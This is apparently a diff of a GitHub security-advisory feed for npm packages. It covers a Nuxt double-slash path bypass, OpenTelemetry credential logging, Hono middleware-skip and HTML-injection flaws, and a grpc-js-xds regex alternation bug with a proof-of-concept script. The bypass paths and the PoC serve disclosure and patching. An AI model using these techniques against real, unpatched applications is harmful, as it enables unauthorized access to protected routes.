+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-node@5.5.8">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-node@5.5.8</a></li>
+<li><a href="https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-node@6.0.1">https://github.com/sveltejs/kit/releases/tag/@sveltejs/adapter-node@6.0.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-rqw3-x7hx-mm3p">https://github.com/advisories/GHSA-rqw3-x7hx-mm3p</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rqw3-x7hx-mm3p</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-11-13T20:36:53.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@nuxt/nitro-server] Nuxt: Incomplete fix for GHSA-9v7c-q64q-vv33: a leading `//` in the request path bypasses `server/middleware` path checks and server route rules on page routes]]></title>
+        <id>https://github.com/advisories/GHSA-r99w-jh2x-3mg9</id>
+        <link href="https://github.com/advisories/GHSA-r99w-jh2x-3mg9"/>
+        <updated>2026-11-13T19:32:23.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>@nuxt/nitro-server</td>
+<td><code>&gt;= 4.6.0, &lt; 4.6.4</code></td>
+<td><code>4.6.4</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="summary">Summary</h3>
+<p>Since <code>4.6.0</code>, Nuxt parses a request path that starts with <code>//</code> as a URL with a host before rendering a page, so <code>//x/admin</code> renders the page at <code>/admin</code>. Nitro's routing, Nitro's route rules and <code>server/middleware</code> see the path as <code>//x/admin</code>, so server-side checks keyed on <code>/admin</code> do not apply. The fix for <a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-9v7c-q64q-vv33">GHSA-9v7c-q64q-vv33</a> in <code>4.6.3</code> covered dot segments but not this form.</p>
+<h3 id="impact">Impact</h3>
+<p>An unauthenticated attacker can bypass server-side controls that match on the request path of a page route.</p>
+<p>A route-scoped server handler is skipped:</p>
+<pre><code class="language-ts">// nuxt.config.ts
+export default defineNuxtConfig({
+  serverHandlers: [{ route: '/admin', middleware: true, handler: '~~/server/admin-guard.ts' }],
+})
+</code></pre>
+<pre><code class="language-ts">// server/admin-guard.ts
+export default defineEventHandler((event) =&gt; {
+  if (!isAuthenticated(event)) {
+    throw createError({ statusCode: 401 })
+  }
+})
+</code></pre>
+<p>With this handler, <code>/admin</code> returns 401, but <code>//x/admin</code> and <code>///x/admin</code> render <code>app/pages/admin.vue</code> along with the data it fetches during server rendering. <code>server/middleware</code> that checks <code>event.path.startsWith('/admin')</code> is skipped in the same way.</p>
+<p>Server-side <code>redirect</code> and <code>headers</code> route rules are also skipped, so <code>'/admin/**': { redirect: '/login' }</code> does not redirect <code>//x/admin/secret</code>, and per-route security headers such as <code>Content-Security-Policy</code> are not sent.</p>
+<p>Browsers send a path such as <code>//x/admin</code> as written, so a plain link is enough to reach the page.</p>
+<p>Not affected:</p>
+<ul>
+<li>API handlers in <code>server/api</code> and <code>server/routes</code>, which Nitro does not match for these paths.</li>
+<li><code>appMiddleware</code> route rules and middleware declared with <code>definePageMeta</code>, which are matched against the resolved route.</li>
+<li>Nuxt <code>3.x</code> and <code>4.0.0</code> to <code>4.5.x</code>, which pass the path to the page router unchanged, so these requests 404.</li>
+</ul>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <code>@nuxt/nitro-server@4.6.4</code>, which <code>nuxt@4.6.4</code> depends on. The renderer now uses the request path exactly as Nitro matched it, so a path starting with <code>//</code> no longer resolves to a different page.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Reject request paths that start with <code>//</code> in a server middleware:</p>
+<pre><code class="language-ts">// server/middleware/double-slash.ts
+export default defineEventHandler((event) =&gt; {
+  if (event.path.startsWith('//')) {
+    throw createError({ statusCode: 404 })
+  }
+})
+</code></pre>
+<p>A reverse proxy or CDN that merges repeated slashes before forwarding the request also removes the mismatch.</p>
+<h3 id="credits">Credits</h3>
+<p>Nuxt thanks @kq5y for reporting this issue.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-r99w-jh2x-3mg9">https://github.com/nuxt/nuxt/security/advisories/GHSA-r99w-jh2x-3mg9</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-128077">https://nvd.nist.gov/vuln/detail/CVE-2026-128077</a></li>
+<li><a href="https://github.com/nuxt/nuxt/commit/75c12c6fb4c22ec2cbde0051da24776d2dffa868">https://github.com/nuxt/nuxt/commit/75c12c6fb4c22ec2cbde0051da24776d2dffa868</a></li>
+<li><a href="https://github.com/nuxt/nuxt/releases/tag/v4.6.4">https://github.com/nuxt/nuxt/releases/tag/v4.6.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-r99w-jh2x-3mg9">https://github.com/advisories/GHSA-r99w-jh2x-3mg9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-r99w-jh2x-3mg9</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-11-13T19:32:21.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@opentelemetry/instrumentation-http] OpenTelemetry JavaScript: Insertion of Sensitive Information into Log File and Exposure of Sensitive Information to an Unauthorized Actor in @opentelemetry/instrumentation-http]]></title>
+        <id>https://github.com/advisories/GHSA-3v2p-hm54-8qcq</id>
+        <link href="https://github.com/advisories/GHSA-3v2p-hm54-8qcq"/>
+        <updated>2026-11-13T19:29:21.000Z</updated>
+        <content type="html"><![CDATA[<h3>Affected versions</h3>
+<table>
+<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
+<tbody>
+<tr>
+<td>@opentelemetry/instrumentation-http</td>
+<td><code>&gt;= 0.204.0, &lt; 0.222.0</code></td>
+<td><code>0.222.0</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="summary">Summary</h3>
+<p><code>@opentelemetry/instrumentation-http</code> redacts sensitive URL query parameters on <strong>outgoing (client) spans</strong> but not on <strong>incoming (server) spans</strong>. The server-span path writes the raw query string verbatim into the <code>url.query</code> attribute, so credentials embedded in inbound request URLs — AWS presigned-URL signatures, Azure SAS tokens (<code>sig</code>), GCS signed-URL signatures — are exported in plaintext to the configured tracing backend.</p>
+<p>Configuring the <code>redactedQueryParams</code> option <strong>does not change this</strong>, as this applies only to outgoing (client) spans.</p>
+<h3 id="impact">Impact</h3>
+<p><strong>Information disclosure / credential leakage</strong> (CWE-200; CWE-532, insertion of sensitive information into telemetry data).</p>
+<p><strong>Who is impacted:</strong> any Node.js service instrumented with <code>@opentelemetry/instrumentation-http</code> — directly or transitively via <code>@opentelemetry/auto-instrumentations-node</code> — that receives inbound requests carrying credentials in the query string. Common cases: services fronting presigned S3/GCS downloads, Azure SAS-token URLs, and signature-authenticated webhooks.</p>
+<p><strong>Consequence:</strong> clients' still-valid credentials are written into server spans and stored by the tracing backend, readable by anyone with span-read access — observability vendor infrastructure, dashboard users, and internal audiences far broader than the credential's intended scope. Presigned-URL signatures typically remain valid for minutes to days after capture, so this is not merely historical exposure.</p>
+<p><strong>Severity:</strong> Moderate. Exploitation requires read access to the telemetry backend, and inbound URLs must actually carry signed credentials. However, the gap is a documented mitigation that silently fails to apply, which defeats the mitigation operators would reach for.</p>
+<h3 id="patches">Patches</h3>
+<p>This vulnerability has been patched in <code>@opentelemetry/instrumentation-http</code> version <code>0.222.0</code>.
+Known sensitive query string values (as defined by Semantic Conventions) are redacted by default from span data for incoming spans.
+The <code>redactedQueryParamsServer</code> configuration option was added for customization.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/open-telemetry/opentelemetry-js/security/advisories/GHSA-3v2p-hm54-8qcq">https://github.com/open-telemetry/opentelemetry-js/security/advisories/GHSA-3v2p-hm54-8qcq</a></li>
+<li><a href="https://github.com/open-telemetry/opentelemetry-js/commit/e086dec7f9304107ef6d50b5877be88895c06aa7">https://github.com/open-telemetry/opentelemetry-js/commit/e086dec7f9304107ef6d50b5877be88895c06aa7</a></li>
+<li><a href="https://github.com/open-telemetry/opentelemetry-js/releases/tag/experimental/v0.222.0">https://github.com/open-telemetry/opentelemetry-js/releases/tag/experimental/v0.222.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-3v2p-hm54-8qcq">https://github.com/advisories/GHSA-3v2p-hm54-8qcq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3v2p-hm54-8qcq</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-11-13T19:29:20.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[astro] Astro: XSS via attribute injection in dynamic tag names]]></title>
         <id>https://github.com/advisories/GHSA-mh32-jxcr-mh9f</id>
@@ -363,914 +902,5 @@ const Tag = Astro.url.searchParams.get('as') ?? 'div';
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-11-12T23:24:11.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[hono] Hono: RegExpRouter skips wildcard middleware for some route sets and for paths with an encoded line terminator]]></title>
-        <id>https://github.com/advisories/GHSA-h7mg-cq63-vhpq</id>
-        <link href="https://github.com/advisories/GHSA-h7mg-cq63-vhpq"/>
-        <updated>2026-11-12T23:23:31.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>hono</td>
-<td><code>&gt;= 4.1.4, &lt;= 4.13.15</code></td>
-<td><code>4.13.16</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="summary">Summary</h3>
-<p>RegExpRouter, which the default <code>SmartRouter</code> selects for most applications, skipped wildcard middleware in three cases, so a route handler ran without the middleware registered for it:</p>
-<ol>
-<li>Middleware whose parameter is written with the explicit default pattern, such as <code>/api/:tenant{[^/]+}/admin/*</code>, was not applied to a route written as <code>/api/:tenant/admin/:id</code>. (since 4.13.0)</li>
-<li>Middleware on <code>/admin/*</code> was not applied to a route registered on <code>/admin*</code> for paths under <code>/admin/</code>. (since 4.1.4)</li>
-<li>For a path with an encoded line terminator (<code>%0A</code>, <code>%0D</code>, <code>%E2%80%A8</code>, <code>%E2%80%A9</code>), no wildcard pattern matched, so the request reached the not-found handler without any wildcard middleware. (since 4.4.0)</li>
-</ol>
-<p>TrieRouter, LinearRouter and PatternRouter apply the middleware in all three cases.</p>
-<h3 id="details">Details</h3>
-<p>RegExpRouter decides at registration time which wildcard middleware covers which route. In cases 1 and 2 it treated patterns that match the same requests as different ones. In case 3 the compiled wildcard did not match line terminators.</p>
-<p>The fix derives the coverage from the structure of the registered paths and lets wildcards match line terminators. It also corrects other differences from the other routers (a wildcard in the middle of a path with parameters, duplicate middleware, middleware on static routes), and rejects custom patterns that can match the empty string, such as <code>{[0-9]*}</code>, with <code>UnsupportedPathError</code>. <code>PreparedRegExpRouter</code> data must be regenerated.</p>
-<h3 id="impact">Impact</h3>
-<p>An unauthenticated client can reach a route handler, or the not-found handler, without the authentication or authorization middleware registered on a wildcard path.</p>
-<p>This affects applications that use RegExpRouter, directly or through the default <code>SmartRouter</code>, and rely on wildcard middleware for authentication or authorization.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Use <code>new Hono({ router: new TrieRouter() })</code>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/honojs/hono/security/advisories/GHSA-h7mg-cq63-vhpq">https://github.com/honojs/hono/security/advisories/GHSA-h7mg-cq63-vhpq</a></li>
-<li><a href="https://github.com/honojs/hono/commit/8a103aa59bcfbffd5396b1548a0dff3688777c36">https://github.com/honojs/hono/commit/8a103aa59bcfbffd5396b1548a0dff3688777c36</a></li>
-<li><a href="https://github.com/honojs/hono/releases/tag/v4.13.16">https://github.com/honojs/hono/releases/tag/v4.13.16</a></li>
-<li><a href="https://github.com/advisories/GHSA-h7mg-cq63-vhpq">https://github.com/advisories/GHSA-h7mg-cq63-vhpq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h7mg-cq63-vhpq</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-11-12T23:23:30.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[hono] Hono: `css` helper does not escape a closing tag split between the template and an interpolated value, allowing HTML injection]]></title>
-        <id>https://github.com/advisories/GHSA-3gg2-335m-rxc6</id>
-        <link href="https://github.com/advisories/GHSA-3gg2-335m-rxc6"/>
-        <updated>2026-11-12T23:22:37.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>hono</td>
-<td><code>&gt;= 3.12.0, &lt;= 4.13.15</code></td>
-<td><code>4.13.16</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="summary">Summary</h3>
-<p>The <code>css</code> helper in <code>hono/css</code> escapes a <code>/</code> that follows <code>&lt;</code> inside an interpolated value so that a value cannot close the <code>&lt;style&gt;</code> element. The check only looks inside each value. When the text before a value ends with <code>&lt;</code>, whether that is the template itself or an earlier interpolated value, and the next value starts with <code>/</code>, the <code>/</code> is not escaped and the combined output contains an unescaped closing tag.</p>
-<h3 id="details">Details</h3>
-<p>Interpolated string values are escaped one at a time before they are joined with the surrounding template text. The rule that neutralizes <code>&lt;/</code> therefore cannot see a <code>&lt;</code> that belongs to the template. A template such as a <code>content</code> declaration that opens with a literal <code>&lt;</code> and interpolates a string right after it produces a raw <code>&lt;/style&gt;</code> when that string starts with <code>/style&gt;</code>. During server-side rendering the <code>&lt;Style /&gt;</code> element is closed early and the rest of the value is interpreted as HTML.</p>
-<p>This issue arises only when <code>&lt;</code> is the last character before an interpolation in a <code>css</code> template, either written in the template or supplied by a preceding value, and the interpolated value is controlled by a client.</p>
-<h3 id="impact">Impact</h3>
-<p>A client that controls such a value can inject HTML, including script, into the page rendered on the server.</p>
-<p>This may lead to:</p>
-<ul>
-<li>Execution of attacker-controlled script in the browser of a user who views the page</li>
-<li>Exposure of information available to that page</li>
-</ul>
-<p>This issue affects applications that interpolate untrusted strings into a <code>css</code> template immediately after a <code>&lt;</code>, including two adjacent interpolations such as <code>${prefix}${name}</code> where both are untrusted. Other uses of the <code>css</code> helper are not affected.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Do not interpolate untrusted values into <code>css</code> templates, or make sure the text before an interpolated value does not end with <code>&lt;</code>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/honojs/hono/security/advisories/GHSA-3gg2-335m-rxc6">https://github.com/honojs/hono/security/advisories/GHSA-3gg2-335m-rxc6</a></li>
-<li><a href="https://github.com/honojs/hono/commit/15bbd96ad1b62a0b189db4fd8dc7bf8ef280c513">https://github.com/honojs/hono/commit/15bbd96ad1b62a0b189db4fd8dc7bf8ef280c513</a></li>
-<li><a href="https://github.com/honojs/hono/releases/tag/v4.13.16">https://github.com/honojs/hono/releases/tag/v4.13.16</a></li>
-<li><a href="https://github.com/advisories/GHSA-3gg2-335m-rxc6">https://github.com/advisories/GHSA-3gg2-335m-rxc6</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3gg2-335m-rxc6</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-11-12T23:22:36.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@grpc/grpc-js-xds] @grpc/grpc-js: safe_regex incorrectly applies partial string matching for patterns with alternation]]></title>
-        <id>https://github.com/advisories/GHSA-r7hq-q2xm-6c5m</id>
-        <link href="https://github.com/advisories/GHSA-r7hq-q2xm-6c5m"/>
-        <updated>2026-11-12T23:21:58.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>@grpc/grpc-js-xds</td>
-<td><code>&lt; 1.13.2</code></td>
-<td><code>1.13.2</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="summary">Summary</h3>
-<p>The StringMatcher/PathMatcher for <code>safe_regex</code> builds its RE2 as <code>^${regex}$</code> with no surrounding group. Because alternation has the lowest precedence, a pattern <code>"a|b|c"</code> compiles to <code>/^a|b|c$/</code> -- "starts with a" OR "contains b" OR "ends with c" instead of a full match of the whole value. Configurations with <code>safe_regex</code> matchers that use a regex alternation (a natural way to list methods or service identities) therefore apply partial string matches. This impacts route selection, xDS credentials, and RBAC.</p>
-<h3 id="details">Details</h3>
-<p><code>src/matcher.ts</code>: <code>SafeRegexValueMatcher</code> and <code>PathSafeRegexValueMatcher</code> both do</p>
-<pre><code class="language-ts">this.targetRegexImpl = new RE2(`^${targetRegex}$`, 'u');
-</code></pre>
-<p>and <code>apply()</code> returns <code>targetRegexImpl.test(value)</code>. With a top-level alternation the anchors bind only to the first/last branch.</p>
-<p><a href="https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/matcher.ts#L59">https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/matcher.ts#L59</a></p>
-<p><a href="https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/matcher.ts#L232">https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/matcher.ts#L232</a></p>
-<p><code>src/route.ts</code> (<code>getPredicateForStringMatcher</code> / <code>getPredicateForHeaderMatcher</code>) builds these for every <code>safe_regex</code> <code>StringMatcher</code>/<code>HeaderMatcher</code>, and src/rbac.ts uses them for RBAC <code>url_path</code> <code>permissions</code>/<code>principals</code>, <code>authenticated.principal_name</code> (mTLS SAN/CN), <code>requested_server_name</code> and <code>header rules</code>. So an ALLOW rule written with an alternation grants access to method names, certificate identities or header values that extend an intended one. DENY policies only become broader (fail-safe).</p>
-<p><a href="https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/route.ts#L28">https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/route.ts#L28</a></p>
-<p><a href="https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/route.ts#L47">https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/route.ts#L47</a></p>
-<h3 id="proof-of-concept">Proof of concept</h3>
-<p>In a scratch directory:</p>
-<pre><code>npm init -y
-npm i @grpc/grpc-js-xds@1.14.1 @grpc/grpc-js
-node poc.cjs
-</code></pre>
-<p><code>poc.cjs</code> calls the exported RBAC engine directly (the functions grpc-js uses to make the authorization decision); no server or network:</p>
-<pre><code class="language-js">const { parseConfig } = require('@grpc/grpc-js-xds/build/src/rbac.js')
-const { SafeRegexValueMatcher } = require('@grpc/grpc-js-xds/build/src/matcher.js')
-const { Metadata } = require('@grpc/grpc-js')
-
-console.log(new SafeRegexValueMatcher('admin|editor').toString()) // SafeRegex(/^admin|editor$/u)
-
-const sr = regex =&gt; ({ match_pattern: 'safe_regex', safe_regex: { regex } })
-const info = urlPath =&gt; ({ urlPath, headers: new Metadata(), tls: true, peerCertificate: null,
-  destinationIp: '10.0.0.1', destinationPort: 443, sourceIp: '10.0.0.2' })
-const g = parseConfig({ action: 'ALLOW', policies: { p: {
-  permissions: [{ rule: 'url_path', url_path: { path: sr('/acme.Users/GetUser|/acme.Users/ListUsers') } }],
-  principals: [{ identifier: 'any', any: true }] } } })
-
-console.log('GetUser       ', g.apply(info('/acme.Users/GetUser')))       // true  (intended)
-console.log('DeleteUser    ', g.apply(info('/acme.Users/DeleteUser')))    // false (control)
-console.log('GetUserSecrets', g.apply(info('/acme.Users/GetUserSecrets'))) // true &lt;-- BYPASS
-</code></pre>
-<p>Observed (grpc-js-xds 1.14.1, grpc-js 1.14.6):</p>
-<pre><code>matcher "admin|editor" -&gt; SafeRegex(/^admin|editor$/u);
-    apply("administrator")=true, apply("not-an-editor")=true
-ALLOW url_path /acme.Users/GetUser|/acme.Users/ListUsers:
-    /acme.Users/GetUser         -&gt; ALLOWED (intended)
-    /acme.Users/DeleteUser      -&gt; denied  (control)
-    /acme.Users/GetUserSecrets  -&gt; ALLOWED &lt;-- bypass (policy intends deny)
-control, same regex as (?:...|...): /acme.Users/GetUserSecrets -&gt; denied
-ALLOW authenticated principal_name spiffe://prod/ns/web/sa/frontend|...ops/sa/admin:
-    spiffe://prod/ns/web/sa/frontend-batch -&gt; ALLOWED &lt;-- bypass
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Users of <code>@grpc/grpc-js-xds</code> who are using <code>safe_regex</code> matchers with alternation for route selection, xDS credentials SAN matchers, or RBAC rules may see incorrectly permissive behavior.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/grpc/grpc-node/security/advisories/GHSA-r7hq-q2xm-6c5m">https://github.com/grpc/grpc-node/security/advisories/GHSA-r7hq-q2xm-6c5m</a></li>
-<li><a href="https://github.com/grpc/grpc-node/commit/3fc3b0ebf7a89d64843a73679951142d33b40cb1">https://github.com/grpc/grpc-node/commit/3fc3b0ebf7a89d64843a73679951142d33b40cb1</a></li>
-<li><a href="https://github.com/grpc/grpc-node/commit/57a67e96babcb29b6eabc1833221ccf2fa152d43">https://github.com/grpc/grpc-node/commit/57a67e96babcb29b6eabc1833221ccf2fa152d43</a></li>
-<li><a href="https://github.com/grpc/grpc-node/releases/tag/@grpc/grpc-js-xds@1.13.2">https://github.com/grpc/grpc-node/releases/tag/@grpc/grpc-js-xds@1.13.2</a></li>
-<li><a href="https://github.com/grpc/grpc-node/releases/tag/@grpc/grpc-js-xds@1.14.2">https://github.com/grpc/grpc-node/releases/tag/@grpc/grpc-js-xds@1.14.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-r7hq-q2xm-6c5m">https://github.com/advisories/GHSA-r7hq-q2xm-6c5m</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r7hq-q2xm-6c5m</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-11-12T23:21:57.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@grpc/grpc-js-xds] @grpc/grpc-js: safe_regex incorrectly applies partial string matching for patterns with alternation]]></title>
-        <id>https://github.com/advisories/GHSA-r7hq-q2xm-6c5m</id>
-        <link href="https://github.com/advisories/GHSA-r7hq-q2xm-6c5m"/>
-        <updated>2026-11-12T23:21:58.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>@grpc/grpc-js-xds</td>
-<td><code>&gt;= 1.14.0, &lt; 1.14.2</code></td>
-<td><code>1.14.2</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="summary">Summary</h3>
-<p>The StringMatcher/PathMatcher for <code>safe_regex</code> builds its RE2 as <code>^${regex}$</code> with no surrounding group. Because alternation has the lowest precedence, a pattern <code>"a|b|c"</code> compiles to <code>/^a|b|c$/</code> -- "starts with a" OR "contains b" OR "ends with c" instead of a full match of the whole value. Configurations with <code>safe_regex</code> matchers that use a regex alternation (a natural way to list methods or service identities) therefore apply partial string matches. This impacts route selection, xDS credentials, and RBAC.</p>
-<h3 id="details">Details</h3>
-<p><code>src/matcher.ts</code>: <code>SafeRegexValueMatcher</code> and <code>PathSafeRegexValueMatcher</code> both do</p>
-<pre><code class="language-ts">this.targetRegexImpl = new RE2(`^${targetRegex}$`, 'u');
-</code></pre>
-<p>and <code>apply()</code> returns <code>targetRegexImpl.test(value)</code>. With a top-level alternation the anchors bind only to the first/last branch.</p>
-<p><a href="https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/matcher.ts#L59">https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/matcher.ts#L59</a></p>
-<p><a href="https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/matcher.ts#L232">https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/matcher.ts#L232</a></p>
-<p><code>src/route.ts</code> (<code>getPredicateForStringMatcher</code> / <code>getPredicateForHeaderMatcher</code>) builds these for every <code>safe_regex</code> <code>StringMatcher</code>/<code>HeaderMatcher</code>, and src/rbac.ts uses them for RBAC <code>url_path</code> <code>permissions</code>/<code>principals</code>, <code>authenticated.principal_name</code> (mTLS SAN/CN), <code>requested_server_name</code> and <code>header rules</code>. So an ALLOW rule written with an alternation grants access to method names, certificate identities or header values that extend an intended one. DENY policies only become broader (fail-safe).</p>
-<p><a href="https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/route.ts#L28">https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/route.ts#L28</a></p>
-<p><a href="https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/route.ts#L47">https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/route.ts#L47</a></p>
-<h3 id="proof-of-concept">Proof of concept</h3>
-<p>In a scratch directory:</p>
-<pre><code>npm init -y
-npm i @grpc/grpc-js-xds@1.14.1 @grpc/grpc-js
-node poc.cjs
-</code></pre>
-<p><code>poc.cjs</code> calls the exported RBAC engine directly (the functions grpc-js uses to make the authorization decision); no server or network:</p>
-<pre><code class="language-js">const { parseConfig } = require('@grpc/grpc-js-xds/build/src/rbac.js')
-const { SafeRegexValueMatcher } = require('@grpc/grpc-js-xds/build/src/matcher.js')
-const { Metadata } = require('@grpc/grpc-js')
-
-console.log(new SafeRegexValueMatcher('admin|editor').toString()) // SafeRegex(/^admin|editor$/u)
-
-const sr = regex =&gt; ({ match_pattern: 'safe_regex', safe_regex: { regex } })
-const info = urlPath =&gt; ({ urlPath, headers: new Metadata(), tls: true, peerCertificate: null,
-  destinationIp: '10.0.0.1', destinationPort: 443, sourceIp: '10.0.0.2' })
-const g = parseConfig({ action: 'ALLOW', policies: { p: {
-  permissions: [{ rule: 'url_path', url_path: { path: sr('/acme.Users/GetUser|/acme.Users/ListUsers') } }],
-  principals: [{ identifier: 'any', any: true }] } } })
-
-console.log('GetUser       ', g.apply(info('/acme.Users/GetUser')))       // true  (intended)
-console.log('DeleteUser    ', g.apply(info('/acme.Users/DeleteUser')))    // false (control)
-console.log('GetUserSecrets', g.apply(info('/acme.Users/GetUserSecrets'))) // true &lt;-- BYPASS
-</code></pre>
-<p>Observed (grpc-js-xds 1.14.1, grpc-js 1.14.6):</p>
-<pre><code>matcher "admin|editor" -&gt; SafeRegex(/^admin|editor$/u);
-    apply("administrator")=true, apply("not-an-editor")=true
-ALLOW url_path /acme.Users/GetUser|/acme.Users/ListUsers:
-    /acme.Users/GetUser         -&gt; ALLOWED (intended)
-    /acme.Users/DeleteUser      -&gt; denied  (control)
-    /acme.Users/GetUserSecrets  -&gt; ALLOWED &lt;-- bypass (policy intends deny)
-control, same regex as (?:...|...): /acme.Users/GetUserSecrets -&gt; denied
-ALLOW authenticated principal_name spiffe://prod/ns/web/sa/frontend|...ops/sa/admin:
-    spiffe://prod/ns/web/sa/frontend-batch -&gt; ALLOWED &lt;-- bypass
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Users of <code>@grpc/grpc-js-xds</code> who are using <code>safe_regex</code> matchers with alternation for route selection, xDS credentials SAN matchers, or RBAC rules may see incorrectly permissive behavior.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/grpc/grpc-node/security/advisories/GHSA-r7hq-q2xm-6c5m">https://github.com/grpc/grpc-node/security/advisories/GHSA-r7hq-q2xm-6c5m</a></li>
-<li><a href="https://github.com/grpc/grpc-node/commit/3fc3b0ebf7a89d64843a73679951142d33b40cb1">https://github.com/grpc/grpc-node/commit/3fc3b0ebf7a89d64843a73679951142d33b40cb1</a></li>
-<li><a href="https://github.com/grpc/grpc-node/commit/57a67e96babcb29b6eabc1833221ccf2fa152d43">https://github.com/grpc/grpc-node/commit/57a67e96babcb29b6eabc1833221ccf2fa152d43</a></li>
